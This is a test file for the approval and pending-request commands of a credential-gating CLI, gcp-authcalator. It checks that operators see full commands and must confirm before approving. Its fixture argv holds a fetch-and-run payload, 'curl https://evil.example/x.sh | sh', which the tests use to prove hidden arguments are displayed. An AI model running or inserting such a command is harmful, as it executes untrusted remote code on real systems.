import { describe, expect, test, afterEach, beforeEach, spyOn } from "bun:test";
import { mkdtempSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { createPendingQueue, type PendingRequest } from "../../gate/pending.ts";
import { describeCommand } from "../../gate/summarize-command.ts";
import { handleAdminRequest } from "../../gate/admin-handlers.ts";
import { runApprove, runPending } from "../../commands/approve.ts";
import type { Config } from "../../config.ts";
import { GateTimeoutError } from "../../gate/connection.ts";
import { makeGateDeps as makeDeps } from "../gate/test-helpers.ts";

describe("approve command (admin socket)", () => {
  let server: ReturnType<typeof Bun.serve> | null = null;

  afterEach(() => {
    if (server) {
      server.stop(true);
      server = null;
    }
  });

  function setup() {
    const dir = mkdtempSync(join(tmpdir(), "approve-test-"));
    const adminSocketPath = join(dir, "admin.sock");
    const queue = createPendingQueue({ timeoutMs: 30000, now: () => Date.now() });
    const deps = makeDeps({ pendingQueue: queue });

    server = Bun.serve({
      unix: adminSocketPath,
      fetch(req) {
        return handleAdminRequest(req, deps);
      },
    });

    return { adminSocketPath, queue };
  }

  test("approves a pending request via admin socket", async () => {
    const { adminSocketPath, queue } = setup();
    const promise = queue.enqueue("user@example.com");
    const [req] = queue.list();

    const res = await fetch(`http://localhost/pending/${req!.id}/approve`, {
      method: "POST",
      unix: adminSocketPath,
    } as RequestInit);
    expect(res.status).toBe(200);
    const body = (await res.json()) as { status: string };
    expect(body.status).toBe("approved");

    expect(await promise).toBe(true);
  });

  test("denies a pending request via admin socket", async () => {
    const { adminSocketPath, queue } = setup();
    const promise = queue.enqueue("user@example.com");
    const [req] = queue.list();

    const res = await fetch(`http://localhost/pending/${req!.id}/deny`, {
      method: "POST",
      unix: adminSocketPath,
    } as RequestInit);
    expect(res.status).toBe(200);
    const body = (await res.json()) as { status: string };
    expect(body.status).toBe("denied");

    expect(await promise).toBe(false);
  });

  test("returns 404 for unknown request ID", async () => {
    const { adminSocketPath } = setup();

    const res = await fetch(`http://localhost/pending/${"f".repeat(32)}/approve`, {
      method: "POST",
      unix: adminSocketPath,
    } as RequestInit);
    expect(res.status).toBe(404);
    const body = (await res.json()) as { error: string };
    expect(body.error).toBe("Request not found or expired");
  });

  test("GET /pending lists requests with the full command over the socket", async () => {
    const { adminSocketPath, queue } = setup();
    // An argument that the 80-character summary drops entirely.
    const payload = "--command=curl https://evil.example/x.sh | sh";
    const argv = [
      "/usr/bin/gcloud",
      "compute",
      "ssh",
      "bastion-01",
      "--zone=us-central1-a",
      "--project=some-fairly-long-project-name",
      payload,
    ];
    const promise = queue.enqueue("user@example.com", describeCommand(argv));

    const res = await fetch("http://localhost/pending", {
      unix: adminSocketPath,
    } as RequestInit);
    expect(res.status).toBe(200);

    const body = (await res.json()) as { pending: PendingRequest[] };
    expect(body.pending).toHaveLength(1);
    expect(body.pending[0]!.command?.summary).not.toContain(payload);
    expect(body.pending[0]!.command?.argv).toContain(payload);

    queue.denyAll();
    await promise;
  });

  test("GET /health returns 200 on admin socket", async () => {
    const { adminSocketPath } = setup();

    const res = await fetch("http://localhost/health", {
      unix: adminSocketPath,
    } as RequestInit);
    expect(res.status).toBe(200);
    const body = (await res.json()) as { status: string };
    expect(body.status).toBe("ok");
  });
});

// ---------------------------------------------------------------------------
// runApprove / runPending
//
// The property under test: approving from the CLI shows the operator the whole
// command first, and cannot happen without a deliberate confirmation.
// ---------------------------------------------------------------------------

describe("runApprove and runPending", () => {
  let server: ReturnType<typeof Bun.serve> | null = null;
  let logSpy: ReturnType<typeof spyOn>;
  let errorSpy: ReturnType<typeof spyOn>;
  let exitSpy: ReturnType<typeof spyOn>;

  const payload = "--command=curl https://evil.example/x.sh | sh";
  const argv = [
    "/usr/bin/gcloud",
    "compute",
    "ssh",
    "bastion-01",
    "--zone=us-central1-a",
    "--project=some-fairly-long-project-name",
    payload,
  ];

  beforeEach(() => {
    logSpy = spyOn(console, "log").mockImplementation(() => {});
    errorSpy = spyOn(console, "error").mockImplementation(() => {});
    exitSpy = spyOn(process, "exit").mockImplementation((() => {
      throw new Error("process.exit");
    }) as never);
  });

  afterEach(() => {
    logSpy.mockRestore();
    errorSpy.mockRestore();
    exitSpy.mockRestore();
    if (server) {
      server.stop(true);
      server = null;
    }
  });

  function setup(options: { timeoutMs?: number; withQueue?: boolean } = {}) {
    const dir = mkdtempSync(join(tmpdir(), "approve-run-test-"));
    const adminSocketPath = join(dir, "admin.sock");
    const queue = createPendingQueue({
      timeoutMs: options.timeoutMs ?? 30000,
      now: () => Date.now(),
    });
    const deps = makeDeps(options.withQueue === false ? {} : { pendingQueue: queue });

    server = Bun.serve({
      unix: adminSocketPath,
      fetch(req) {
        return handleAdminRequest(req, deps);
      },
    });

    const config = { admin_socket_path: adminSocketPath } as Config;
    return { config, queue };
  }

  /** Serve a fixed response on an admin socket, for cases the real gate can't produce. */
  function setupStub(handler: (req: Request) => Response) {
    const dir = mkdtempSync(join(tmpdir(), "approve-stub-test-"));
    const adminSocketPath = join(dir, "admin.sock");
    server = Bun.serve({ unix: adminSocketPath, fetch: handler });
    return { config: { admin_socket_path: adminSocketPath } as Config };
  }

  /** Everything printed to stdout during the call, joined. */
  function output(): string {
    return logSpy.mock.calls.map((call: unknown[]) => String(call[0] ?? "")).join("\n");
  }

  test("runPending prints every argument of a queued command", async () => {
    const { config, queue } = setup();
    const promise = queue.enqueue("user@example.com", describeCommand(argv), "prod-breakglass");

    await runPending(config, []);

    expect(output()).toContain("user@example.com");
    expect(output()).toContain("prod-breakglass");
    for (const arg of argv.slice(1)) {
      expect(output()).toContain(arg);
    }

    queue.denyAll();
    await promise;
  });

  test("runPending reports an empty queue", async () => {
    const { config } = setup();
    await runPending(config, []);
    expect(output()).toContain("No pending requests.");
  });

  test("runPending shows a single request by ID", async () => {
    const { config, queue } = setup();
    const id = "d".repeat(32);
    const promise = queue.enqueue("user@example.com", describeCommand(argv), undefined, id);

    await runPending(config, [id]);
    expect(output()).toContain(id);
    expect(output()).toContain(payload);

    queue.denyAll();
    await promise;
  });

  test("approve prints the full command before resolving", async () => {
    const { config, queue } = setup();
    const id = "e".repeat(32);
    const promise = queue.enqueue("user@example.com", describeCommand(argv), undefined, id);

    await runApprove(config, [id], { yes: true });

    // The argument the 80-char summary drops must be on screen before the
    // "Approved" line, not after it.
    const lines = output();
    expect(lines).toContain(payload);
    expect(lines.indexOf(payload)).toBeLessThan(lines.indexOf("Approved request"));
    expect(await promise).toBe(true);
  });

  test("approve refuses to resolve without confirmation when not on a TTY", async () => {
    const { config, queue } = setup();
    const id = "f".repeat(32);
    const promise = queue.enqueue("user@example.com", describeCommand(argv), undefined, id);

    await expect(runApprove(config, [id], { isTTY: false })).rejects.toThrow("process.exit");
    expect(errorSpy.mock.calls.flat().join(" ")).toContain("re-run with --yes");

    // Still pending: nothing was approved behind the operator's back.
    expect(queue.list()).toHaveLength(1);
    queue.denyAll();
    expect(await promise).toBe(false);
  });

  test("approve aborts when the operator does not type yes", async () => {
    const { config, queue } = setup();
    const id = "0".repeat(32);
    const promise = queue.enqueue("user@example.com", describeCommand(argv), undefined, id);

    await expect(
      runApprove(config, [id], { isTTY: true, readLine: async () => "y\n" }),
    ).rejects.toThrow("process.exit");
    expect(queue.list()).toHaveLength(1);

    queue.denyAll();
    expect(await promise).toBe(false);
  });

  test("approve proceeds when the operator types yes", async () => {
    const { config, queue } = setup();
    const id = "1".repeat(32);
    const promise = queue.enqueue("user@example.com", describeCommand(argv), undefined, id);

    await runApprove(config, [id], { isTTY: true, readLine: async () => "  YES \n" });
    expect(await promise).toBe(true);
  });

  test("approve shows how long is left, not just an absolute timestamp", async () => {
    const { config, queue } = setup();
    const id = "3".repeat(32);
    const promise = queue.enqueue("user@example.com", describeCommand(argv), undefined, id);

    await runApprove(config, [id], { yes: true });
    expect(output()).toMatch(/Expires:.*\(\d+s left\)/);
    expect(await promise).toBe(true);
  });

  test("approve gives up rather than resolving after the request expires", async () => {
    const { config, queue } = setup();
    const id = "4".repeat(32);
    const promise = queue.enqueue("user@example.com", describeCommand(argv), undefined, id);

    // An operator who spends the whole window actually reading a long argv —
    // which is what this command asks them to do — must not have their `yes`
    // land on an already-expired request.
    await expect(
      runApprove(config, [id], { isTTY: true, readLine: async () => null }),
    ).rejects.toThrow("process.exit");
    expect(errorSpy.mock.calls.flat().join(" ")).toContain("expired while waiting");

    queue.denyAll();
    expect(await promise).toBe(false);
  });

  test("a route-miss 404 is reported as a stale daemon, not as an expired request", async () => {
    const dir = mkdtempSync(join(tmpdir(), "approve-stale-test-"));
    const adminSocketPath = join(dir, "admin.sock");
    // A gate that predates GET /pending/:id: every unknown route 404s with the
    // generic body.
    server = Bun.serve({
      unix: adminSocketPath,
      fetch: () => Response.json({ error: "Not found" }, { status: 404 }),
    });
    const config = { admin_socket_path: adminSocketPath } as Config;

    await expect(runApprove(config, ["5".repeat(32)], { yes: true })).rejects.toThrow(
      "process.exit",
    );
    const errors = errorSpy.mock.calls.flat().join(" ");
    expect(errors).toContain("does not serve GET /pending");
    expect(errors).not.toContain("may have expired");
  });

  test("a genuinely absent request explains the GUI-path case too", async () => {
    const { config } = setup();

    await expect(runApprove(config, ["6".repeat(32)], { yes: true })).rejects.toThrow(
      "process.exit",
    );
    const errors = errorSpy.mock.calls.flat().join(" ");
    expect(errors).toContain("no queued request");
    expect(errors).toContain("desktop dialog");
  });

  test("prints usage when no ID is given", async () => {
    const { config } = setup();
    await runApprove(config, [], {});

    expect(output()).toContain("Usage: gcp-authcalator approve <id>");
    expect(output()).toContain("gcp-authcalator pending");
  });

  test("rejects malformed request IDs locally without contacting the admin socket", async () => {
    const { config } = setup();
    const fetchFn = spyOn(globalThis, "fetch");

    await expect(
      runApprove(config, ["../../health"], {
        yes: true,
        fetchFn: fetchFn as unknown as typeof globalThis.fetch,
      }),
    ).rejects.toThrow("process.exit");
    expect(fetchFn).not.toHaveBeenCalled();
    expect(errorSpy.mock.calls.flat().join(" ")).toContain("invalid pending request ID");

    fetchFn.mockClear();
    await expect(
      runPending(config, ["A".repeat(32)], {
        fetchFn: fetchFn as unknown as typeof globalThis.fetch,
      }),
    ).rejects.toThrow("process.exit");
    expect(fetchFn).not.toHaveBeenCalled();
    fetchFn.mockRestore();
  });

  test("shows requests that reported no command", async () => {
    const { config, queue } = setup();
    const promise = queue.enqueue("user@example.com");

    await runPending(config, []);
    expect(output()).toContain("(none reported)");

    queue.denyAll();
    await promise;
  });

  test("surfaces a non-404 error from the gate when listing", async () => {
    const { config } = setup({ withQueue: false });

    await expect(runPending(config, [])).rejects.toThrow("process.exit");
    expect(errorSpy.mock.calls.flat().join(" ")).toContain("Pending queue not enabled");
  });

  test("surfaces a non-404 error from the gate when approving", async () => {
    const { config } = setup({ withQueue: false });

    await expect(runApprove(config, ["7".repeat(32)], { yes: true })).rejects.toThrow(
      "process.exit",
    );
    expect(errorSpy.mock.calls.flat().join(" ")).toContain("Pending queue not enabled");
  });

  test("reports a request that expired between listing and resolving", async () => {
    // The gate prunes expired entries before serving them, so the only way to
    // see this is a gate whose clock ran ahead of ours — model it directly.
    const { config } = setupStub(() =>
      Response.json({
        id: "8".repeat(32),
        email: "user@example.com",
        createdAt: new Date(Date.now() - 300_000).toISOString(),
        expiresAt: new Date(Date.now() - 180_000).toISOString(),
      }),
    );

    await expect(runApprove(config, ["8".repeat(32)], { isTTY: true })).rejects.toThrow(
      "process.exit",
    );
    expect(errorSpy.mock.calls.flat().join(" ")).toContain("already expired");
  });

  test("reports a request that vanished before the resolve POST", async () => {
    const { config } = setupStub((req) =>
      new URL(req.url).pathname.endsWith("/approve")
        ? Response.json({ error: "Request not found or expired" }, { status: 404 })
        : Response.json({
            id: "9".repeat(32),
            email: "user@example.com",
            createdAt: new Date().toISOString(),
            expiresAt: new Date(Date.now() + 60_000).toISOString(),
          }),
    );

    await expect(runApprove(config, ["9".repeat(32)], { yes: true })).rejects.toThrow(
      "process.exit",
    );
    expect(errorSpy.mock.calls.flat().join(" ")).toContain("not found (may have expired)");
  });

  test("bounds both the inspect and resolve admin-socket requests", async () => {
    const signals: AbortSignal[] = [];
    const id = "a".repeat(32);
    const fetchFn = (async (input: string | URL | Request, init?: RequestInit) => {
      expect(init?.signal).toBeInstanceOf(AbortSignal);
      signals.push(init!.signal!);
      const url = typeof input === "string" ? input : input instanceof URL ? input.href : input.url;
      if (url.endsWith("/approve")) return Response.json({ status: "approved" });
      return Response.json({
        id,
        email: "user@example.com",
        createdAt: new Date().toISOString(),
        expiresAt: new Date(Date.now() + 60_000).toISOString(),
      });
    }) as unknown as typeof globalThis.fetch;
    const config = { admin_socket_path: "/tmp/test-admin.sock" } as Config;

    await runApprove(config, [id], { yes: true, fetchFn });

    expect(signals).toHaveLength(2);
  });

  test("bounds pending-list requests", async () => {
    let signal: AbortSignal | null = null;
    const fetchFn = (async (_input: string | URL | Request, init?: RequestInit) => {
      signal = init?.signal ?? null;
      return Response.json({ pending: [] });
    }) as unknown as typeof globalThis.fetch;
    const config = { admin_socket_path: "/tmp/test-admin.sock" } as Config;

    await runPending(config, [], { fetchFn });

    expect(signal).toBeInstanceOf(AbortSignal);
  });

  test("reports a wedged admin socket as a timeout", async () => {
    const fetchFn = (async () => {
      throw new GateTimeoutError(
        5_000,
        "http://localhost/pending",
        new DOMException("The operation was aborted", "AbortError"),
      );
    }) as unknown as typeof globalThis.fetch;
    const config = { admin_socket_path: "/tmp/test-admin.sock" } as Config;

    await expect(runPending(config, [], { fetchFn })).rejects.toThrow("process.exit");
    const errors = errorSpy.mock.calls.flat().join(" ");
    expect(errors).toContain("admin socket not responding");
    expect(errors).not.toContain("could not connect");
  });

  test("reports an unreachable admin socket with its configured path", async () => {
    const fetchFn = (async () => {
      throw new Error("FailedToOpenSocket");
    }) as unknown as typeof globalThis.fetch;
    const config = { admin_socket_path: "/tmp/missing-admin.sock" } as Config;

    await expect(runPending(config, [], { fetchFn })).rejects.toThrow("process.exit");
    const errors = errorSpy.mock.calls.flat().join(" ");
    expect(errors).toContain("could not connect to the admin socket");
    expect(errors).toContain("/tmp/missing-admin.sock");
  });

  test("reports a non-JSON admin error without exposing a SyntaxError", async () => {
    const fetchFn = (async () =>
      new Response("Internal Server Error", { status: 500 })) as unknown as typeof globalThis.fetch;
    const config = { admin_socket_path: "/tmp/test-admin.sock" } as Config;

    await expect(runPending(config, [], { fetchFn })).rejects.toThrow("process.exit");
    expect(errorSpy.mock.calls.flat().join(" ")).toContain("admin socket returned HTTP 500");
  });

  describe("the real stdin reader", () => {
    /** Feed the production readLine (no injected reader) once it is listening. */
    async function answer(text: string): Promise<void> {
      await new Promise((r) => setTimeout(r, 20));
      process.stdin.emit("data", text);
    }

    test("approves when the operator types yes on stdin", async () => {
      const { config, queue } = setup();
      const id = "a".repeat(32);
      const promise = queue.enqueue("user@example.com", describeCommand(argv), undefined, id);

      const run = runApprove(config, [id], { isTTY: true });
      await answer("yes\n");
      await run;

      expect(await promise).toBe(true);
    });

    test("aborts when the operator types something else on stdin", async () => {
      const { config, queue } = setup();
      const id = "b".repeat(32);
      const promise = queue.enqueue("user@example.com", describeCommand(argv), undefined, id);

      const run = runApprove(config, [id], { isTTY: true });
      await answer("no\n");
      await expect(run).rejects.toThrow("process.exit");

      expect(queue.list()).toHaveLength(1);
      queue.denyAll();
      expect(await promise).toBe(false);
    });

    test("gives up on its own when the request's window closes", async () => {
      // A short-lived request stands in for an operator who spends the whole
      // window reading: the reader must abandon rather than block forever.
      const { config, queue } = setup({ timeoutMs: 400 });
      const id = "c".repeat(32);
      const promise = queue.enqueue("user@example.com", describeCommand(argv), undefined, id);

      await expect(runApprove(config, [id], { isTTY: true })).rejects.toThrow("process.exit");
      expect(errorSpy.mock.calls.flat().join(" ")).toContain("expired while waiting");
      expect(await promise).toBe(false);
    });
  });

  test("deny resolves without a confirmation prompt", async () => {
    const { config, queue } = setup();
    const id = "2".repeat(32);
    const promise = queue.enqueue("user@example.com", describeCommand(argv), undefined, id);

    await runApprove(config, [id], { deny: true });
    expect(await promise).toBe(false);
  });
});
